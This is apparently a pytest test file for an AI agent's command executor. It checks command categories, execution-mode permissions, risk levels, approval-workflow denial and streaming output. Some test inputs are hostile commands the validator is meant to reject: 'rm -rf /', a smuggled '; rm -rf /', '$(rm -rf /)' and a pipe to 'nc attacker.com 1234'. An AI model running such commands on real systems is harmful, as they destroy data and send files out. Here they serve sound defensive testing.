"""
Comprehensive tests for the Enhanced Program Executor.
"""

import asyncio
import sys
from pathlib import Path
from unittest.mock import AsyncMock, Mock, patch

import pytest

# Add project root to path for testing
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

from omnimancer.core.agent.program_executor import (
    CommandCategory,
    CommandResult,
    CommandValidator,
    EnhancedProgramExecutor,
    ExecutionConfig,
    ExecutionMode,
    SecurityError,
    StreamingExecutor,
)
from omnimancer.core.security.approval_workflow import (
    ApprovalWorkflow,
    RiskLevel,
)
from omnimancer.core.security.sandbox_manager import (
    SandboxManager,
)


@pytest.fixture
def command_validator():
    """Create a command validator instance."""
    return CommandValidator()


@pytest.fixture
def mock_sandbox_manager():
    """Create a mock sandbox manager."""
    return Mock(spec=SandboxManager)


@pytest.fixture
def mock_approval_workflow():
    """Create a mock approval workflow."""
    return Mock(spec=ApprovalWorkflow)


@pytest.fixture
def program_executor(mock_sandbox_manager, mock_approval_workflow):
    """Create a program executor instance."""
    return EnhancedProgramExecutor(
        sandbox_manager=mock_sandbox_manager,
        approval_workflow=mock_approval_workflow,
    )


@pytest.fixture
def execution_config():
    """Create a basic execution configuration."""
    return ExecutionConfig(
        timeout_seconds=10,
        max_memory_mb=256,
        execution_mode=ExecutionMode.DEVELOPMENT,
        require_approval=False,
    )


class TestCommandValidator:
    """Test command validation functionality."""

    def test_command_categories(self, command_validator):
        """Test command categorization."""
        # Safe read commands
        assert command_validator.get_command_category("ls") == CommandCategory.SAFE_READ
        assert (
            command_validator.get_command_category("cat") == CommandCategory.SAFE_READ
        )
        assert (
            command_validator.get_command_category("grep") == CommandCategory.SAFE_READ
        )

        # Development commands
        assert (
            command_validator.get_command_category("git") == CommandCategory.DEVELOPMENT
        )
        assert (
            command_validator.get_command_category("npm") == CommandCategory.DEVELOPMENT
        )
        assert (
            command_validator.get_command_category("python")
            == CommandCategory.DEVELOPMENT
        )

        # Dangerous commands
        assert command_validator.get_command_category("rm") == CommandCategory.DANGEROUS
        assert (
            command_validator.get_command_category("sudo") == CommandCategory.DANGEROUS
        )
        assert (
            command_validator.get_command_category("chmod") == CommandCategory.DANGEROUS
        )

        # Unknown command
        assert command_validator.get_command_category("unknown_command") is None

    def test_execution_mode_permissions(self, command_validator):
        """Test command permissions by execution mode."""
        # Restricted mode - only safe read
        assert command_validator.is_command_allowed("ls", ExecutionMode.RESTRICTED)
        assert command_validator.is_command_allowed("cat", ExecutionMode.RESTRICTED)
        assert not command_validator.is_command_allowed("git", ExecutionMode.RESTRICTED)
        assert not command_validator.is_command_allowed("rm", ExecutionMode.RESTRICTED)

        # Development mode - safe read + development + system info
        assert command_validator.is_command_allowed("ls", ExecutionMode.DEVELOPMENT)
        assert command_validator.is_command_allowed("git", ExecutionMode.DEVELOPMENT)
        assert command_validator.is_command_allowed("ps", ExecutionMode.DEVELOPMENT)
        assert not command_validator.is_command_allowed("rm", ExecutionMode.DEVELOPMENT)

        # Full access mode - includes network and build tools
        assert command_validator.is_command_allowed("ls", ExecutionMode.FULL_ACCESS)
        assert command_validator.is_command_allowed("git", ExecutionMode.FULL_ACCESS)
        assert command_validator.is_command_allowed("docker", ExecutionMode.FULL_ACCESS)
        assert command_validator.is_command_allowed("curl", ExecutionMode.FULL_ACCESS)
        assert not command_validator.is_command_allowed(
            "rm", ExecutionMode.FULL_ACCESS
        )  # Still blocked

    def test_risk_assessment(self, command_validator):
        """Test command risk assessment."""
        # Low risk commands
        assert command_validator.assess_command_risk("ls", ["-la"]) == RiskLevel.LOW
        assert (
            command_validator.assess_command_risk("cat", ["file.txt"]) == RiskLevel.LOW
        )

        # Medium risk commands
        assert (
            command_validator.assess_command_risk("git", ["clone", "repo"])
            == RiskLevel.MEDIUM
        )
        assert (
            command_validator.assess_command_risk("npm", ["install"])
            == RiskLevel.MEDIUM
        )

        # High risk commands
        assert (
            command_validator.assess_command_risk("curl", ["http://example.com"])
            == RiskLevel.HIGH
        )
        assert (
            command_validator.assess_command_risk("apt", ["install", "package"])
            == RiskLevel.HIGH
        )

        # Critical risk commands
        assert (
            command_validator.assess_command_risk("rm", ["-rf", "/"])
            == RiskLevel.CRITICAL
        )
        assert (
            command_validator.assess_command_risk("sudo", ["rm", "file"])
            == RiskLevel.CRITICAL
        )

    def test_dangerous_patterns(self, command_validator):
        """Test detection of dangerous command patterns."""
        # Dangerous rm patterns
        assert (
            command_validator.assess_command_risk("rm", ["-rf", "/"])
            == RiskLevel.CRITICAL
        )
        assert (
            command_validator.assess_command_risk("ls", ["|", "nc", "host"])
            == RiskLevel.CRITICAL
        )

        # Command substitution patterns would be checked in full command analysis
        # This is a simplified test focusing on the core functionality

    def test_argument_validation(self, command_validator):
        """Test command argument validation and sanitization."""
        # Safe arguments
        safe_args = ["file.txt", "-la", "--verbose"]
        sanitized = command_validator.validate_command_args("ls", safe_args)
        assert len(sanitized) == len(safe_args)

        # Dangerous arguments with shell metacharacters
        with pytest.raises(SecurityError):
            command_validator.validate_command_args("ls", ["file.txt; rm -rf /"])

        with pytest.raises(SecurityError):
            command_validator.validate_command_args(
                "cat", ["file.txt | nc attacker.com 1234"]
            )

        with pytest.raises(SecurityError):
            command_validator.validate_command_args("echo", ["$(rm -rf /)"])


class TestStreamingExecutor:
    """Test streaming output functionality."""

    @pytest.mark.asyncio
    async def test_streaming_callback(self):
        """Test streaming with callback."""
        captured_output = []

        def stream_callback(stream_type: str, content: str):
            captured_output.append((stream_type, content))

        streaming_executor = StreamingExecutor(stream_callback)

        # Mock process with stdout/stderr
        mock_process = Mock()
        mock_stdout = AsyncMock()
        mock_stderr = AsyncMock()

        # Simulate output lines
        mock_stdout.readline.side_effect = [
            b"line 1\n",
            b"line 2\n",
            b"",
        ]  # EOF
        mock_stderr.readline.side_effect = [b"error 1\n", b""]  # EOF

        mock_process.stdout = mock_stdout
        mock_process.stderr = mock_stderr

        await streaming_executor.stream_process_output(mock_process)

        # Check captured output
        assert len(captured_output) >= 2
        assert any("line 1" in content for _, content in captured_output)
        assert any("error 1" in content for _, content in captured_output)

    def test_output_accumulation(self):
        """Test output buffer accumulation."""
        streaming_executor = StreamingExecutor()

        # Simulate accumulated output
        streaming_executor.stdout_buffer = ["line 1\n", "line 2\n"]
        streaming_executor.stderr_buffer = ["error 1\n"]

        stdout, stderr = streaming_executor.get_output()
        assert stdout == "line 1\nline 2\n"
        assert stderr == "error 1\n"


class TestEnhancedProgramExecutor:
    """Test the enhanced program executor."""

    @pytest.mark.asyncio
    async def test_simple_command_execution(self, program_executor, execution_config):
        """Test basic command execution."""
        # Disable streaming to avoid mock complexity
        execution_config.enable_streaming = False

        # Test with echo command (should be safe)
        with patch("asyncio.create_subprocess_exec") as mock_subprocess:
            # Mock successful process
            mock_process = AsyncMock()
            mock_process.returncode = 0
            mock_process.communicate.return_value = (b"hello world\n", b"")
            mock_process.wait.return_value = None
            mock_subprocess.return_value = mock_process

            result = await program_executor.execute_command(
                "echo", ["hello", "world"], execution_config
            )

            assert result.success is True
            assert result.exit_code == 0
            assert "hello world" in result.stdout
            assert result.command == "echo"
            assert result.args == ["hello", "world"]

    @pytest.mark.asyncio
    async def test_command_validation_failure(self, program_executor, execution_config):
        """Test command validation failure."""
        # Try to execute a dangerous command
        result = await program_executor.execute_command(
            "rm", ["-rf", "/"], execution_config
        )

        assert result.success is False
        assert result.exit_code == -1
        assert "not allowed" in result.error_message.lower()

    @pytest.mark.asyncio
    async def test_command_timeout(self, program_executor):
        """Test command timeout handling."""
        config = ExecutionConfig(
            timeout_seconds=1, require_approval=False, enable_streaming=False
        )

        with patch("asyncio.create_subprocess_exec") as mock_subprocess:
            # Mock process that takes too long
            mock_process = AsyncMock()
            mock_process.communicate.side_effect = asyncio.TimeoutError()
            mock_process.terminate = Mock()
            mock_process.kill = Mock()
            mock_process.wait.return_value = None
            mock_subprocess.return_value = mock_process

            result = await program_executor.execute_command("sleep", ["10"], config)

            assert result.success is False
            assert result.was_terminated is True
            assert "timed out" in result.error_message.lower()
            mock_process.terminate.assert_called_once()

    @pytest.mark.asyncio
    async def test_approval_workflow_integration(self, program_executor):
        """Test integration with approval workflow."""
        config = ExecutionConfig(require_approval=True)

        # Mock approval workflow to deny request
        mock_request = Mock()
        mock_request.status.value = "denied"
        program_executor.approval_workflow.request_approval = AsyncMock(
            return_value=mock_request
        )

        result = await program_executor.execute_command("git", ["status"], config)

        assert result.success is False
        assert "denied" in result.error_message.lower()
        program_executor.approval_workflow.request_approval.assert_called_once()

    @pytest.mark.asyncio
    async def test_execution_history(self, program_executor, execution_config):
        """Test execution history tracking."""
        execution_config.enable_streaming = False

        with patch("asyncio.create_subprocess_exec") as mock_subprocess:
            mock_process = AsyncMock()
            mock_process.returncode = 0
            mock_process.communicate.return_value = (b"output\n", b"")
            mock_process.wait.return_value = None
            mock_subprocess.return_value = mock_process

            # Execute a few commands
            await program_executor.execute_command("ls", ["-la"], execution_config)
            await program_executor.execute_command("pwd", [], execution_config)

            history = program_executor.get_execution_history()
            assert len(history) == 2
            assert history[0].command == "ls"
            assert history[1].command == "pwd"

    def test_process_tracking(self, program_executor):
        """Test active process tracking."""
        # Initially no processes
        active = program_executor.get_active_processes()
        assert len(active) == 0

        # Add mock process
        mock_process = Mock()
        mock_process.process.args = ["ls", "-la"]
        mock_process.process.pid = 12345
        mock_process.start_time = 1000.0
        mock_process.is_running.return_value = True

        program_executor.active_processes["test_exec"] = mock_process

        with patch("time.time", return_value=1010.0):  # 10 seconds later
            active = program_executor.get_active_processes()
            assert len(active) == 1
            assert "test_exec" in active
            assert active["test_exec"]["pid"] == 12345
            assert active["test_exec"]["runtime"] == 10.0

    def test_execution_modes(self, command_validator):
        """Test different execution modes."""
        # Restricted mode
        assert command_validator.is_command_allowed("ls", ExecutionMode.RESTRICTED)
        assert not command_validator.is_command_allowed("git", ExecutionMode.RESTRICTED)

        # Development mode
        assert command_validator.is_command_allowed("ls", ExecutionMode.DEVELOPMENT)
        assert command_validator.is_command_allowed("git", ExecutionMode.DEVELOPMENT)
        assert not command_validator.is_command_allowed(
            "docker", ExecutionMode.DEVELOPMENT
        )

        # Full access mode
        assert command_validator.is_command_allowed("ls", ExecutionMode.FULL_ACCESS)
        assert command_validator.is_command_allowed("git", ExecutionMode.FULL_ACCESS)
        assert command_validator.is_command_allowed("docker", ExecutionMode.FULL_ACCESS)


class TestCommandResult:
    """Test CommandResult functionality."""

    def test_command_result_creation(self):
        """Test CommandResult creation and properties."""
        result = CommandResult(
            success=True,
            command="ls",
            args=["-la"],
            exit_code=0,
            stdout="file1\nfile2\n",
            stderr="",
            execution_time=1.5,
        )

        assert result.success is True
        assert result.full_command == "ls -la"
        assert result.execution_time == 1.5
        assert result.was_terminated is False

    def test_failed_command_result(self):
        """Test failed command result."""
        result = CommandResult(
            success=False,
            command="invalid_command",
            args=[],
            exit_code=127,
            error_message="Command not found",
        )

        assert result.success is False
        assert result.exit_code == 127
        assert result.error_message == "Command not found"
        assert result.full_command == "invalid_command"


class TestExecutionConfig:
    """Test ExecutionConfig functionality."""

    def test_default_config(self):
        """Test default execution configuration."""
        config = ExecutionConfig()

        assert config.timeout_seconds == 30
        assert config.max_memory_mb == 512
        assert config.execution_mode == ExecutionMode.DEVELOPMENT
        assert config.enable_streaming is True
        assert config.require_approval is True

    def test_custom_config(self):
        """Test custom execution configuration."""
        config = ExecutionConfig(
            timeout_seconds=60,
            max_memory_mb=1024,
            execution_mode=ExecutionMode.RESTRICTED,
            enable_streaming=False,
            require_approval=False,
        )

        assert config.timeout_seconds == 60
        assert config.max_memory_mb == 1024
        assert config.execution_mode == ExecutionMode.RESTRICTED
        assert config.enable_streaming is False
        assert config.require_approval is False


@pytest.mark.asyncio
async def test_streaming_command_output(program_executor, execution_config):
    """Test real-time command output streaming."""
    execution_config.enable_streaming = True

    with patch("asyncio.create_subprocess_exec") as mock_subprocess:
        mock_process = AsyncMock()
        mock_process.returncode = 0
        mock_process.wait.return_value = None

        # Mock streaming output with proper stream mocking
        mock_stdout = AsyncMock()
        mock_stderr = AsyncMock()

        # Make readline return empty to terminate streams quickly
        mock_stdout.readline.side_effect = [b""]
        mock_stderr.readline.side_effect = [b""]

        mock_process.stdout = mock_stdout
        mock_process.stderr = mock_stderr
        mock_subprocess.return_value = mock_process

        # Test that streaming doesn't hang
        result = await program_executor.execute_command(
            "echo", ["test"], execution_config
        )

        # Should complete without hanging
        assert result is not None


@pytest.mark.asyncio
async def test_integration_with_real_commands():
    """Integration test with real (safe) commands."""
    # Only run this test if we can execute safe commands
    # Create executor with mocked dependencies to avoid initialization issues
    mock_sandbox = Mock(spec=SandboxManager)
    mock_approval = Mock(spec=ApprovalWorkflow)

    executor = EnhancedProgramExecutor(
        sandbox_manager=mock_sandbox, approval_workflow=mock_approval
    )
    config = ExecutionConfig(
        timeout_seconds=5,
        execution_mode=ExecutionMode.DEVELOPMENT,
        require_approval=False,
    )

    # Test echo command (universally available and safe)
    try:
        result = await executor.execute_command("echo", ["hello", "world"], config)

        if result.success:
            assert "hello world" in result.stdout
            assert result.exit_code == 0
        else:
            # Command might not be available in test environment
            pytest.skip("Echo command not available in test environment")

    except Exception as e:
        # Skip if we can't execute commands in test environment
        pytest.skip(f"Cannot execute commands in test environment: {e}")


# Remove the main block to prevent pytest from running when file is imported
# Tests should be run using pytest command directly
